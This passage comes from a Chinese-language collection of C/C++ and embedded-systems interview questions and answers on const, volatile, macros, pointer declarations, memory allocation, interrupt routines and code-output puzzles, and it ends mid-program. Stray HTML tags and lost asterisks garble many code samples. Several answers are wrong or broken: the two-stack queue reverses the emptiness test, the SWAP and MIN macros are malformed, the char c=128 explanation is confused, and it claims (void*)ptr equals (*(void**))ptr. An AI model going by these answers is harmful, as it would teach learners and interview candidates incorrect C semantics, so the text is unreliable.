能做什么和不能做什么.如果你从没<br>有读到那篇文章，只要能说出 const 意味着“只读”就可以了。尽管这个答案不是完全的答案，<br>但我接受它作为一个正确的答案。（如果你想知道更详细的答案，仔细读一下 Saks 的文章<br>吧。）如果应试者能正确回答这个问题，我将问他一个附加的问题：下面的声明都是什么意<br>思？<br>const int a;<br>int const a;<br>const int *a;<br>int * const a;<br>int const * a const;<br>前两个的作用是一样，a 是一个常整型数。第三个意味着 a 是一个指向常整型数的指针（也<br>就是，整型数是不可修改的，但指针可以）。第四个意思 a 是一个指向整型数的常指针（也<br>就是说，指针指向的整型数是可以修改的，但指针是不可修改的）。最后一个意味着 a 是一<br>个指向常整型数的常指针（也就是说，指针指向的整型数是不可修改的，同时指针也是不可<br>修改的）。如果应试者能正确回答这些问题，那么他就给我留下了一个好印象。顺带提一句，<br>也许你可能会问，即使不用关键字 const，也还是能很容易写出功能正确的程序，那么我为<br>什么还要如此看重关键字 const 呢？我也如下的几下理由：<br>1). 关键字 const 的作用是为给读你代码的人传达非常有用的信息，实际上，声明一个参数<br>为常量是为了告诉了用户这个参数的应用目的。如果你曾花很多时间清理其它人留下的垃<br>圾，你就会很快学会感谢这点多余的信息。（当然，懂得用 const 的程序员很少会留下的垃<br>圾让别人来清理的。）<br>2). 通过给优化器一些附加的信息，使用关键字 const 也许能产生更紧凑的代码。<br>3). 合理地使用关键字 const 可以使编译器很自然地保护那些不希望被改变的参数，防止其<br>被无意的代码修改。简而言之，这样可以减少 bug 的出现<br>23、关键字 volatile 有什么含意 并给出三个不同的例子。<br>答：一个定义为 volatile 的变量是说这变量可能会被意想不到地改变，这样，编译器就不会<br>去假设这个变量的值了。精确地说就是，优化器在用到这个变量时必须每次都小心地重新读<br>取这个变量的值，而不是使用保存在寄存器里的备份。下面是 volatile 变量的几个例子：<br>1). 并行设备的硬件寄存器（如：状态寄存器）<br>2). 一个中断服务子程序中会访问到的非自动变量(Non-automatic variables)<br>3). 多线程应用中被几个任务共享的变量<br>回答不出这个问题的人是不会被雇佣的。我认为这是区分 C 程序员和嵌入式系统程序员的<br>最基本的问题。嵌入式系统程序员经常同硬件、中断、RTOS 等等打交道，所用这些都要求<br>volatile 变量。不懂得 volatile 内容将会带来灾难。<br>假设被面试者正确地回答了这是问题（嗯，怀疑这否会是这样），我将稍微深究一下，看一<br>下这家伙是不是直正懂得 volatile 完全的重要性。<br>1). 一个参数既可以是 const 还可以是 volatile 吗？解释为什么。<br>2). 一个指针可以是 volatile 吗？解释为什么。<br>3). 下面的函数有什么错误：<br>int square(volatile int *ptr)<br>{<br>return *ptr * *ptr;<br>}<br>下面是答案：<br>1). 是的。一个例子是只读的状态寄存器。它是 volatile 因为它可能被意想不到地改变。它<br>是 const 因为程序不应该试图去修改它。<br>2). 是的。尽管这并不很常见。一个例子是当一个中服务子程序修该一个指向一个 buffer 的<br>指针时。<br>3). 这段代码的有个恶作剧。这段代码的目的是用来返指针</em>ptr 指向值的平方，但是，由于<br><em>ptr 指向一个 volatile 型参数，编译器将产生类似下面的代码：<br>int square(volatile int *ptr)<br>{<br>int a,b;<br>a = *ptr;<br>b = *ptr;<br>return a * b;<br>}<br>由于</em>ptr 的值可能被意想不到地该变，因此 a 和 b 可能是不同的。结果，这段代码可能返不<br>是你所期望的平方值！正确的代码如下：<br>long square(volatile int <em>ptr)<br>{<br>int a;<br>a = *ptr;<br>return a * a;<br>}<br>24、三种基本的数据模型<br>答：按照数据结构类型的不同，将数据模型划分为层次模型、网状模型和关系模型。<br>25、结构与联合有和区别？<br>答：(1). 结构和联合都是由多个不同的数据类型成员组成, 但在任何同一时刻, 联合中只存<br>放了一个被选中的成员（所有成员共用一块地址空间）, 而结构的所有成员都存在（不同成<br>员的存放地址不同）。<br>(2). 对于联合的不同成员赋值, 将会对其它成员重写, 原来成员的值就不存在了, 而对于结<br>构的不同成员赋值是互不影响的<br>26、描述内存分配方式以及它们的区别?<br>答：1） 从静态存储区域分配。内存在程序编译的时候就已经分配好，这块内存在程序的整<br>个运行期间都存在。例如全局变量，static 变量。<br>2） 在栈上创建。在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行<br>结束时这些存储单元自动被释放。栈内存分配运算内置于处理器的指令集。<br>3） 从堆上分配，亦称动态内存分配。程序在运行的时候用 malloc 或 new 申请任意多少的<br>内存，程序员自己负责在何时用 free 或 delete 释放内存。动态内存的生存期由程序员决定，<br>使用非常灵活，但问题也最多<br>27、请说出 const 与#define 相比，有何优点？<br>答：Const 作用：定义常量、修饰函数参数、修饰函数返回值三个作用。被 Const 修饰的东<br>西都受到强制保护，可以预防意外的变动，能提高程序的健壮性。<br>1） const 常量有数据类型，而宏常量没有数据类型。编译器可以对前者进行类型安全检查。<br>而对后者只进行字符替换，没有类型安全检查，并且在字符替换可能会产生意料不到的错误。<br>2） 有些集成化的调试工具可以对 const 常量进行调试，但是不能对宏常量进行调试。<br>28、简述数组与指针的区别？<br>答：数组要么在静态存储区被创建（如全局数组），要么在栈上被创建。指针可以随时指向<br>任意类型的内存块。<br>(1)修改内容上的差别<br>char a[] = “hello”;<br>a[0] = ‘X’;<br>char *p = “world”; // 注意 p 指向常量字符串<br>p[0] = ‘X’; // 编译器不能发现该错误，运行时错误<br>(2) 用运算符 sizeof 可以计算出数组的容量（字节数）。sizeof(p),p 为指针得到的是一个 指<br>针变量的字节数，而不是 p 所指的内存容量。C++/C 语言没有办法知道指针所指的内存容<br>量，除非在申请内存时记住它。注意当数组作为函数的参数进行传递时，该数组自动退化为<br>同类型的指针。<br>char a[] = “hello world”;<br>char *p = a;<br>cout&lt;&lt; sizeof(a) &lt;&lt; endl; // 12 字节<br>cout&lt;&lt; sizeof(p) &lt;&lt; endl; // 4 字节<br>计算数组和指针的内存容量<br>void Func(char a[100])<br>{<br>cout&lt;&lt; sizeof(a) &lt;&lt; endl; // 4 字节而不是100 字节<br>}<br>29、分别写出 BOOL,int,float,指针类型的变量 a 与“零”的比较语句。<br>答：BOOL : if ( !a ) or if(a)<br>int : if ( a == 0)<br>float : const EXPRESSION EXP = 0.000001<br>if ( a &lt; EXP &amp;&amp; a &gt;-EXP)<br>pointer : if ( a != NULL) or if(a == NULL)<br>30、如何判断一段程序是由 C 编译程序还是由 C++编译程序编译的？<br>答：#ifdef __cplusplus<br>cout&lt;&lt;”c++”;<br>#else<br>cout&lt;&lt;”c”;<br>#endif<br>31、论述含参数的宏与函数的优缺点<br>答： 带参宏 函数<br>处理时间 编译时 程序运行时<br>参数类型 没有参数类型问题 定义实参、形参类型<br>处理过程 不分配内存 分配内存<br>程序长度 变长 不变<br>运行速度 不占运行时间 调用和返回占用时间<br>32、用两个栈实现一个队列的功能？要求给出算法和思路！<br>答 、设2个栈为 A,B, 一开始均为空.<br>入队:<br>将新元素 push 入栈 A;<br>出队:<br>(1)判断栈 B 是否为空；<br>(2)如果不为空，则将栈 A 中所有元素依次 pop 出并 push 到栈 B；<br>(3)将栈 B 的栈顶元素 pop 出；<br>这样实现的队列入队和出队的平摊复杂度都还是 O(1), 比上面的几种方法要好<br>33、嵌入式系统中经常要用到无限循环，你怎么样用 C 编写死循环呢？<br>答：这个问题用几个解决方案。我首选的方案是：<br>while(1)<br>{<br>}<br>一些程序员更喜欢如下方案：<br>for(;;)<br>{<br>}<br>这个实现方式让我为难，因为这个语法没有确切表达到底怎么回事。如果一个应试者给出这<br>个作为方案，我将用这个作为一个机会去探究他们这样做的<br>基本原理。如果他们的基本答案是：“我被教着这样做，但从没有想到过为什么。”这会给我<br>留下一个坏印象。<br>第三个方案是用 goto<br>Loop:<br>…<br>goto Loop;<br>应试者如给出上面的方案，这说明或者他是一个汇编语言程序员（这也许是好事）或者他是<br>一个想进入新领域的 BASIC/FORTRAN 程序员。<br>34、位操作（Bit manipulation）<br>答： 嵌入式系统总是要用户对变量或寄存器进行位操作。给定一个整型变量 a，写两段代<br>码，第一个设置 a 的 bit 3，第二个清除 a 的 bit 3。在以上两个操作中，要保持其它位不变。<br>对这个问题有三种基本的反应<br>1)不知道如何下手。该被面者从没做过任何嵌入式系统的工作。<br>2) 用 bit fields。Bit fields 是被扔到 C 语言死角的东西，它保证你的代码在不同编译器之间<br>是不可移植的，同时也保证了的你的代码是不可重用的。我最近不幸看到 Infineon 为其较<br>复杂的通信芯片写的驱动程序，它用到了 bit fields 因此完全对我无用，因为我的编译器用其<br>它的方式来实现 bit fields 的。从道德讲：永远不要让一个非嵌入式的家伙粘实际硬件的边。<br>3) 用 #defines 和 bit masks 操作。这是一个有极高可移植性的方法，是应该被用到的方法。<br>最佳的解决方案如下：<br>#define BIT3 (0x1 &lt;&lt; 3)<br>static int a;<br>void set_bit3(void)<br>{<br>a |= BIT3;<br>}<br>void clear_bit3(void)<br>{<br>a &amp;= <del>BIT3;<br>}<br>一些人喜欢为设置和清除值而定义一个掩码同时定义一些说明常数，这也是可以接受的。我<br>希望看到几个要点：说明常数、|=和&amp;=</del>操作。<br>35、访问固定的内存位置（Accessing fixed memory locations）<br>答：嵌入式系统经常具有要求程序员去访问某特定的内存位置的特点。在某工程中，要求设<br>置一绝对地址为0x67a9的整型变量的值为0xaa66。编译器是一个纯粹的 ANSI 编译器。写代<br>码去完成这一任务。<br>这一问题测试你是否知道为了访问一绝对地址把一个整型数强制转换（typecast）为一指针<br>是合法的。这一问题的实现方式随着个人风格不同而不同。典型的类似代码如下：<br>int *ptr;<br>ptr = (int *)0x67a9;<br>*ptr = 0xaa66;<br>A more obscure approach is:<br>一个较晦涩的方法是：<br>*(int * const)(0x67a9) = 0xaa55;<br>即使你的品味更接近第二种方案，但我建议你在面试时使用第一种方案。<br>36、中断（Interrupts）<br>答： 中断是嵌入式系统中重要的组成部分，这导致了很多编译开发商提供一种扩展—让标<br>准 C 支持中断。具代表事实是，产生了一个新的关键字 __interrupt。下面的代码就使用了<br>__interrupt 关键字去定义了一个中断服务子程序(ISR)，请评论一下这段代码的。<br>__interrupt double compute_area (double radius)<br>{<br>double area = PI * radius * radius;<br>printf(“\nArea = %f”, area);<br>return area;<br>}<br>这个函数有太多的错误了，以至让人不知从何说起了：<br>1)ISR 不能返回一个值。如果你不懂这个，那么你不会被雇用的。<br>2) ISR 不能传递参数。如果你没有看到这一点，你被雇用的机会等同第一项。<br>3) 在许多的处理器/编译器中，浮点一般都是不可重入的。有些处理器/编译器需要让额处的<br>寄存器入栈，有些处理器/编译器就是不允许在 ISR 中做浮点运算。此外，ISR 应该是短而<br>有效率的，在 ISR 中做浮点运算是不明智的。<br>4) 与第三点一脉相承，printf()经常有重入和性能上的问题。如果你丢掉了第三和第四点，<br>我不会太为难你的。不用说，如果你能得到后两点，那么你的被雇用前景越来越光明了。<br>37、动态内存分配（Dynamic memory allocation）<br>答：尽管不像非嵌入式计算机那么常见，嵌入式系统还是有从堆（heap）中动态分配内存的<br>过程的。那么嵌入式系统中，动态分配内存可能发生的问题是什么？<br>这里，我期望应试者能提到内存碎片，碎片收集的问题，变量的持行时间等等。这个主题已<br>经在 ESP 杂志中被广泛地讨论过了（主要是 P.J. Plauger, 他的解释远远超过我这里能提到<br>的任何解释），所有回过头看一下这些杂志吧！让应试者进入一种虚假的安全感觉后，我拿<br>出这么一个小节目：<br>下面的代码片段的输出是什么，为什么？<br>char *ptr;<br>if ((ptr = (char *)malloc(0)) == NULL)<br>puts(“Got a null pointer”);<br>else<br>puts(“Got a valid pointer”);<br>这是一个有趣的问题。最近在我的一个同事不经意把0值传给了函数 malloc，得到了一个合<br>法的指针之后，我才想到这个问题。这就是上面的代码，该代码的输出是”Got a valid pointer”。<br>我用这个来开始讨论这样的一问题，看看被面试者是否想到库例程这样做是正确。得到正确<br>的答案固然重要，但解决问题的方法和你做决定的基本原理更重要些。<br>38、Typedef<br>答：Typedef 在 C 语言中频繁用以声明一个已经存在的数据类型的同义字。也可以用预处理<br>器做类似的事。例如，思考一下下面的例子：<br>#define dPS struct s *<br>typedef struct s * tPS;<br>以上两种情况的意图都是要定义 dPS 和 tPS 作为一个指向结构 s 指针。哪种方法更好呢？<br>（如果有的话）为什么？<br>这是一个非常微妙的问题，任何人答对这个问题（正当的原因）是应当被恭喜的。答案是：<br>typedef 更好。思考下面的例子：<br>dPS p1,p2;<br>tPS p3,p4;<br>第一个扩展为<br>struct s * p1, p2;<br>上面的代码定义 p1为一个指向结构的指，p2为一个实际的结构，这也许不是你想要的。第<br>二个例子正确地定义了 p3 和 p4 两个指针。<br>39、用变量 a 给出下面的定义<br>答：a) 一个整型数（An integer）<br>b) 一个指向整型数的指针（A pointer to an integer）<br>c) 一个指向指针的的指针，它指向的指针是指向一个整型数（A pointer to a pointer to an<br>integer）<br>d) 一个有10个整型数的数组（An array of 10 integers）<br>e) 一个有10个指针的数组，该指针是指向一个整型数的（An array of 10 pointers to integers）<br>f) 一个指向有10个整型数数组的指针（A pointer to an array of 10 integers）<br>g) 一个指向函数的指针，该函数有一个整型参数并返回一个整型数（A pointer to a function<br>that takes an integer as an argument and returns an integer）<br>h) 一个有10个指针的数组，该指针指向一个函数，该函数有一个整型参数并返回一个整型<br>数（ An array of ten pointers to functions that take an integer<br>argument and return an integer ）<br>答案是：<br>a) int a; // An integer<br>b) int *a; // A pointer to an integer<br>c) int **a; // A pointer to a pointer to an integer<br>d) int a[10]; // An array of 10 integers<br>e) int *a[10]; // An array of 10 pointers to integers<br>f) int (*a)[10]; // A pointer to an array of 10 integers<br>g) int (*a)(int); // A pointer to a function a that takes an integer argument and returns an integer<br>h) int (*a[10])(int); // An array of 10 pointers to functions that take an integer argument and return<br>an integer<br>40、解释局部变量、全局变量和静态变量的含义。<br>答：<br>41、写一个“标准”宏<br>答：交换两个参数值的宏定义为：. #define SWAP(a,b)<br>(a)=(a)+(b);<br>(b)=(a)-(b);<br>(a)=(a)-(b);<br>输入两个参数，输出较小的一个：#define MIN(A,B) ((A) &lt; (B))? (A) : (B))<br>表明1年中有多少秒（忽略闰年问题）：#define SECONDS_PER_YEAR (60 * 60 * 24 * 365)UL<br>#define DOUBLE(x) x+x 与 #define DOUBLE(x) （（x）+（x））<br>i = 5*DOUBLE(5)； i 为30 i = 5*DOUBLE(5)； i 为50<br>已知一个数组 table，用一个宏定义，求出数据的元素个数<br>#define NTBL<br>#define NTBL (sizeof(table)/sizeof(table[0]))<br>42、A.c 和 B.c 两个 c 文件中使用了两个相同名字的 static 变量,编译的时候会不会有问题?<br>这两个 static 变量会保存到哪里（栈还是堆或者其他的）?<br>答：static 的全局变量，表明这个变量仅在本模块中有意义，不会影响其他模块。<br>他们都放在数据区，但是编译器对他们的命名是不同的。<br>如果要使变量在其他模块也有意义的话，需要使用 extern 关键字。<br>43、一个单向链表，不知道头节点,一个指针指向其中的一个节点，问如何删除这个指针指<br>向的节点？<br>答：将这个指针指向的 next 节点值 copy 到本节点，将 next 指向 next-&gt;next,并随后删除原 next<br>指向的节点。<br>第二部分：程序代码评价或者找错<br>1、下面的代码输出是什么，为什么？<br>void foo(void)<br>{<br>unsigned int a = 6;<br>int b = -20;<br>(a+b &gt; 6) ? puts(“&gt; 6″) : puts(“&lt;= 6”);<br>}<br>这个问题测试你是否懂得 C 语言中的整数自动转换原则，我发现有些开发者懂得极少这些<br>东西。不管如何，这无符号整型问题的答案是输出是 “&gt;6″。原因是当表达式中存在有符号<br>类型和无符号类型时所有的操作数都自动转换为无符号类型。因此-20变成了一个非常大的<br>正整数，所以该表达式计算出的结果大于6。这一点对于应当频繁用到无符号数据类型的嵌<br>入式系统来说是丰常重要的。如果你答错了这个问题，你也就到了得不到这份工作的边缘。<br>2、评价下面的代码片断：<br>unsigned int zero = 0;<br>unsigned int compzero = 0xFFFF;<br>/*1′s complement of zero */<br>对于一个 int 型不是16位的处理器为说，上面的代码是不正确的。应编写如下：<br>unsigned int compzero = ~0;<br>这一问题真正能揭露出应试者是否懂得处理器字长的重要性。在我的经验里，好的嵌入式程<br>序员非常准确地明白硬件的细节和它的局限，然而 PC 机程序往往把硬件作为一个无法避免<br>的烦恼。<br>3、 C 语言同意一些令人震惊的结构,下面的结构是合法的吗，如果是它做些什么？<br>int a = 5, b = 7, c;<br>c = a+++b;<br>这个问题将做为这个测验的一个愉快的结尾。不管你相不相信，上面的例子是完全合乎语法<br>的。问题是编译器如何处理它？水平不高的编译作者实际上会争论这个问题，根据最处理原<br>则，编译器应当能处理尽可能所有合法的用法。因此，上面的代码被处理成：<br>c = a++ + b;<br>因此, 这段代码持行后 a = 6, b = 7, c = 12。<br>如果你知道答案，或猜出正确答案，做得好。如果你不知道答案，我也不把这个当作问题。<br>我发现这个问题的最大好处是这是一个关于代码编写风格，代码的可读性，代码的可修改性<br>的好的话题。<br>4、设有以下说明和定义：<br>typedef union {long i; int k[5]; char c;} DATE;<br>struct data { int cat; DATE cow; double dog;} too;<br>DATE max;<br>则语句 printf(“%d”,sizeof(struct date)+sizeof(max));的执行结果是？<br>答 、结果是：52。DATE 是一个 union, 变量公用空间. 里面最大的变量类型是 int[5], 占用<br>20个字节. 所以它的大小是20<br>data 是一个 struct, 每个变量分开占用空间. 依次为 int4 + DATE20 + double8 = 32.<br>所以结果是 20 + 32 = 52.<br>当然…在某些16位编辑器下, int 可能是2字节,那么结果是 int2 + DATE10 + double8 = 20<br>5、请写出下列代码的输出内容<br>#include<br>main()<br>{<br>int a,b,c,d;<br>a=10;<br>b=a++;<br>c=++a;<br>d=10</em>a++;<br>printf(“b，c，d：%d，%d，%d”，b，c，d）;<br>return 0;<br>}<br>答：10，12，120<br>6、写出下列代码的输出内容<br>#include<br>int inc(int a)<br>{<br>return(++a);<br>}<br>int multi(int<em>a,int</em>b,int<em>c)<br>{<br>return(<em>c=<em>a</em></em>b);<br>}<br>typedef int(FUNC1)(int in);<br>typedef int(FUNC2) (int</em>,int*,int*);<br>void show(FUNC2 fun,int arg1, int<em>arg2)<br>{<br>INCp=&inc;<br>int temp =p(arg1);<br>fun(&amp;temp,&amp;arg1, arg2);<br>printf(“%d\n”,<em>arg2);<br>}<br>main()<br>{<br>int a;<br>show(multi,10,&amp;a);<br>return 0;<br>}<br>答：110<br>7、请找出下面代码中的所以错误<br>说明：以下代码是把一个字符串倒序，如“abcd”倒序后变为“dcba”<br>1、#include”string.h”<br>2、main()<br>3、{<br>4、 char</em>src=”hello,world”;<br>5、 char</em> dest=NULL;<br>6、 int len=strlen(src);<br>7、 dest=(char*)malloc(len);<br>8、 char* d=dest;<br>9、 char* s=src[len];<br>10、 while(len–!=0)<br>11、 d++=s–;<br>12、 printf(“%s”,dest);<br>13、 return 0;<br>14、}<br>答：<br>方法1：<br>int main(){<br>char* src = “hello,world”;<br>int len = strlen(src);<br>char* dest = (char*)malloc(len+1);//要为\0分配一个空间<br>char* d = dest;<br>char* s = &amp;src[len-1];//指向最后一个字符<br>while( len– != 0 )<br><em>d++=<em>s–;<br>*d = 0;//尾部要加\0<br>printf(“%s\n”,dest);<br>free(dest);// 使用完，应当释放空间，以免造成内存汇泄露<br>return 0;<br>}<br>方法2：<br>#include<br>#include<br>main()<br>{<br>char str[]=”hello,world”;<br>int len=strlen(str);<br>char t;<br>for(int i=0; i<br>{<br>t=str[i];<br>str[i]=str[len-i-1]; str[len-i-1]=t;<br>}<br>printf(“%s”,str);<br>return 0;<br>}<br>8、请问下面程序有什么错误?<br>int a[60][250][1000],i,j,k;<br>for(k=0;k&lt;=1000;k++)<br>for(j=0;j&lt;250;j++)<br>for(i=0;i&lt;60;i++)<br>a[i][j][k]=0;<br>答案：把循环语句内外换一下<br>9、请问下面程序会出现什么情况?<br>. #define Max_CB 500<br>void LmiQueryCSmd(Struct MSgCB * pmsg)<br>{<br>unsigned char ucCmdNum;<br>……<br>for(ucCmdNum=0;ucCmdNum<br>{<br>……;<br>}<br>答案：死循环<br>10、以下3个有什么区别<br>char * const p; //常量指针，p 的值不可以修改<br>char const * p；//指向常量的指针，指向的常量值不可以改<br>const char *p； //和 char const *p<br>11、写出下面的结果<br>char str1[] = “abc”;<br>char str2[] = “abc”;<br>const char str3[] = “abc”;<br>const char str4[] = “abc”;<br>const char *str5 = “abc”;<br>const char *str6 = “abc”;<br>char *str7 = “abc”;<br>char *str8 = “abc”;<br>cout &lt;&lt; ( str1 == str2 ) &lt;&lt; endl;<br>cout &lt;&lt; ( str3 == str4 ) &lt;&lt; endl;<br>cout &lt;&lt; ( str5 == str6 ) &lt;&lt; endl;<br>cout &lt;&lt; ( str7 == str8 ) &lt;&lt; endl;<br>结果是：0 0 1 1<br>解答：str1,str2,str3,str4是数组变量，它们有各自的内存空间；<br>而 str5,str6,str7,str8是指针，它们指向相同的常量区域。<br>12、以下代码中的两个 sizeof 用法有问题吗？<br>void UpperCase( char str[] ) // 将 str 中的小写字母转换成大写字母<br>{<br>for( size_t i=0; i<br>if( ‘a’&lt;=str[i] &amp;&amp; str[i]&lt;=’z’ )<br>str[i] -= (‘a’-‘A’ );<br>}<br>char str[] = “aBcDe”;<br>cout &lt;&lt; “str 字符长度为: “ &lt;&lt; sizeof(str)/sizeof(str[0]) &lt;&lt; endl;<br>UpperCase( str );<br>cout &lt;&lt; str &lt;&lt; endl;<br>答：函数内的 sizeof 有问题。根据语法，sizeof 如用于数组，只能测出静态数组的大小，无<br>法检测动态分配的或外部数组大小。函数外的 str 是一个静态定义的数组，因此其大小为6，<br>函数内的 str 实际只是一个指向字符串的指针，没有任何额外的与数组相关的信息，因此<br>sizeof 作用于上只将其当指针看，一个指针为4个字节，因此返回4。<br>13、写出输出结果<br>main()<br>{<br>int a[5]={1,2,3,4,5};<br>int *ptr=(int *)(&amp;a+1);<br>printf(“%d,%d”,*(a+1),*(ptr-1));<br>}<br>输出：2,5<br>*(a+1）就是 a[1]，*(ptr-1)就是 a[4],执行结果是2，5<br>&amp;a+1不是首地址+1，系统会认为加一个 a 数组的偏移，是偏移了一个数组的大小（本例是5<br>个 int）<br>int *ptr=(int *)(&amp;a+1);<br>则 ptr 实际是&amp;(a[5]),也就是 a+5<br>原因如下：<br>&amp;a 是数组指针，其类型为 int (*)[5];<br>而指针加1要根据指针类型加上一定的值，<br>不同类型的指针+1之后增加的大小不同<br>a 是长度为5的 int 数组指针，所以要加 5*sizeof(int)<br>所以 ptr 实际是 a[5]<br>但是 prt 与(&amp;a+1)类型是不一样的(这点很重要)<br>所以 prt-1只会减去 sizeof(int*)<br>a,&amp;a 的地址是一样的，但意思不一样，a 是数组首地址，也就是 a[0]的地址，&amp;a 是对象（数<br>组）首地址，a+1是数组下一元素的地址，即 a[1],&amp;a+1是下一个对象的地址，即 a[5].<br>14、请问以下代码有什么问题：<br>int main()<br>{<br>char a;<br>char *str=&a;<br>strcpy(str,”hello”);<br>printf(str);<br>return 0;<br>}<br>没有为 str 分配内存空间，将会发生异常<br>问题出在将一个字符串复制进一个字符变量指针所指地址。虽然可以正确输出结果，但因为<br>越界进行内在读写而导致程序崩溃。<br>char* s=”AAA”;<br>printf(“%s”,s);<br>s[0]=’B’;<br>printf(“%s”,s);<br>有什么错？<br>“AAA”是字符串常量。s 是指针，指向这个字符串常量，所以声明 s 的时候就有问题。<br>cosnt char* s=”AAA”;<br>然后又因为是常量，所以对是 s[0]的赋值操作是不合法的。<br>15、有以下表达式：<br>int a=248; b=4;int const c=21;const int *d=&a;<br>int *const e=&b;int const *f const =&a;<br>请问下列表达式哪些会被编译器禁止？为什么？<br>*c=32;d=&b;*d=43;e=34;e=&a;f=0x321f;<br>*c 这是个什么东东，禁止<br>*d 说了是 const， 禁止<br>e = &amp;a 说了是 const 禁止<br>const *f const =&a; 禁止<br>16、交换两个变量的值，不使用第三个变量。<br>即 a=3,b=5,交换之后 a=5,b=3;<br>有两种解法, 一种用算术算法, 一种用^(异或)<br>a = a + b;<br>b = a - b;<br>a = a - b;<br>or<br>a = a^b;// 只能对 int,char..<br>b = a^b;<br>a = a^b;<br>or<br>a ^= b ^= a;<br>17、下面的程序会出现什么结果<br>.#include<br>#include<br>void getmemory(char *p)<br>{<br>p=(char *) malloc(100);<br>strcpy(p,”hello world”);<br>}<br>int main( )<br>{<br>char *str=NULL;<br>getmemory(str);<br>printf(“%s/n”,str);<br>free(str);<br>return 0;<br>}<br>程序崩溃，getmemory 中的 malloc 不能返回动态内存， free（）对 str 操作很危险<br>18、下面的语句会出现什么结果？<br>char szstr[10];<br>strcpy(szstr,”0123456789″);<br>答案：长度不一样，会造成非法的 OS，应该改为 char szstr[11]；<br>19、(void *)ptr 和 (*(void**))ptr 的结果是否相同？<br>答：其中 ptr 为同一个指针<br>.(void *)ptr 和 (*(void**))ptr 值是相同的<br>20、问函数既然不会被其它函数调用，为什么要返回1？<br>int main()<br>{<br>int x=3;<br>printf(“%d”,x);<br>return 1;<br>}<br>答：mian 中，c 标准认为0表示成功，非0表示错误。具体的值是某中具体出错信息<br>21、对绝对地址0×100000赋值且想让程序跳转到绝对地址是0×100000去执行<br>(unsigned int*)0×100000 = 1234;<br>首先要将0×100000强制转换成函数指针,即:<br>(void (*)())0×100000<br>然后再调用它:<br>*((void (*)())0×100000)();<br>用 typedef 可以看得更直观些:<br>typedef void(*)() voidFuncPtr;<br>*((voidFuncPtr)0×100000)();<br>22、输出多少？并分析过程<br>unsigned short A = 10;<br>printf(“~A = %u\n”, ~A);<br>char c=128;<br>printf(“c=%d\n”,c);<br>第一题，～A ＝0xfffffff5,int 值 为－11，但输出的是 uint。所以输出4294967285<br>第二题，c＝0×10,输出的是 int，最高位为1，是负数，所以它的值就是0×00的补码就是128，<br>所以输出－128。<br>这两道题都是在考察二进制向 int 或 uint 转换时的最高位处理。<br>23、分析下面的程序：<br>void GetMemory(char **p,int num)<br>{<br>*p=(char *)malloc(num);<br>}<br>int main()<br>{<br>char *str=NULL;<br>GetMemory(&amp;str,100);<br>strcpy(str,”hello”);<br>free(str);<br>if(str!=NULL)<br>{<br>strcpy(str,”world”);<br>}<br>printf(“\n str is %s”,str);<br>getchar();<br>}<br>问输出结果是什么？希望大家能说说原因，先谢谢了<br>输出 str is world。<br>free 只是释放的 str 指向的内存空间,它本身的值还是存在的.<br>所以 free 之后，有一个好的习惯就是将 str=NULL.<br>此时 str 指向空间的内存已被回收,如果输出语句之前还存在分配空间的操作的话,这段存储<br>空间是可能被重新分配给其他变量的,<br>尽管这段程序确实是存在大大的问题（上面各位已经说得很清楚了），但是通常会打印出<br>world 来。<br>这是因为，进程中的内存管理一般不是由操作系统完成的，而是由库函数自己完成的。<br>当你 malloc 一块内存的时候，管理库向操作系统申请一块空间（可能会比你申请的大一些），<br>然后在这块空间中记录一些管理信息（一般是在你申请的内存前面一点），并将可用内存的<br>地址返回。但是释放内存的时候，管理库通常都不会将内存还给操作系统，因此你是可以继<br>续访问这块地址的，只不过。。。。。。。。楼上都说过了，最好别这么干。<br>24、char a[10],strlen(a)为什么等于15？运行的结果<br>#include “stdio.h”<br>#include “string.h”<br>void main()<br>{<br>char aa[10];<br>printf(“%d”,strlen(aa));<br>}<br>sizeof()和初不初始化，没有关系；<br>strlen()和初始化有关。<br>char (*str)[20];/*str 是一个数组指针，即指向数组的指针．*/<br>char *str[20];/*str 是一个指针数组，其元素为指针型数据．*/<br>25、long a=0×801010;a+5=?<br>答：0×801010用二进制表示为：“1000 0000 0001 0000 0001 0000”，十进制的值为8392720，<br>再加上5就是8392725<br>26、给定结构 struct A<br>{<br>char t:：4;<br>char k:4;<br>unsigned short i:8;<br>unsigned long m;<br>};问 sizeof(A) = ?<br>给定结构 struct A<br>{<br>char t:4; 4位<br>char k:4; 4位<br>unsigned short i:8; 8位<br>unsigned long m; // 偏移2字节保证4字节对齐<br>}; // 共8字节<br>27、下面的函数实现在一个数上加一个数，有什么错误？请改正。<br>int add_n ( int n )<br>{<br>static int i = 100;<br>i += n;<br>return i;<br>}<br>当你第二次调用时得不到正确的结果，难道你写个函数就是为了调用一次？问题就出在<br>static 上<br>28、给出下面程序的答案<br>#include<br>#include<br>#include<br>#include<br>#include<br>#include<br>typedef struct AA<br>{<br>int b1:5;<br>int b2:2;<br>}AA;<br>void main()<br>{<br>AA aa;<br>char cc[100];<br>strcpy(cc,”0123456789abcdefghijklmnopqrstuvwxyz”);<br>memcpy(&amp;aa,cc,sizeof(AA));<br>cout &lt;&lt; aa.b1 &lt;<br>cout &lt;&lt; aa.b2 &lt;<br>}<br>答案是 -16和１<br>首先 sizeof(AA)的大小为4,b1和 b2分别占5bit 和2bit.<br>经过 strcpy 和 memcpy 后,aa 的4个字节所存放的值是:<br>0,1,2,3的 ASC 码，即00110000,00110001,00110010,00110011<br>所以，最后一步：显示的是这４个字节的前５位，和之后的２位<br>分别为：10000,和01<br>因为 int 是有正负之分 所以：答案是-16和１<br>29、求函数返回值，输入 x=9999;<br>int func （ x ）<br>{<br>int countx = 0;<br>while ( x )<br>{<br>countx ++;<br>x = x&amp;(x-1);<br>}<br>return countx;<br>}<br>结果呢？<br>知道了这是统计9999的二进制数值中有多少个1的函数，且有<br>9999＝9×1024＋512＋256＋15<br>9×1024中含有1的个数为2；<br>512中含有1的个数为1；<br>256中含有1的个数为1；<br>15中含有1的个数为4；<br>故共有1的个数为8，结果为8。<br>1000 - 1 = 0111，正好是原数取反。这就是原理。<br>用这种方法来求1的个数是很效率很高的。<br>不必去一个一个地移位。循环次数最少。<br>30、分析：<br>struct bit<br>{ int a:3;<br>int b:2;<br>int c:3;<br>};<br>int main()<br>{<br>bit s;<br>char *c=(char*)&s;<br>cout&lt;&lt;&lt;endl;<br>*c=0x99;<br>cout &lt;&lt; s.a &lt;&lt;&lt;s.b&lt;&lt;endl&lt;&lt;s.c&lt;&lt;endl;<br>int a=-1;<br>printf(“%x”,a);<br>return 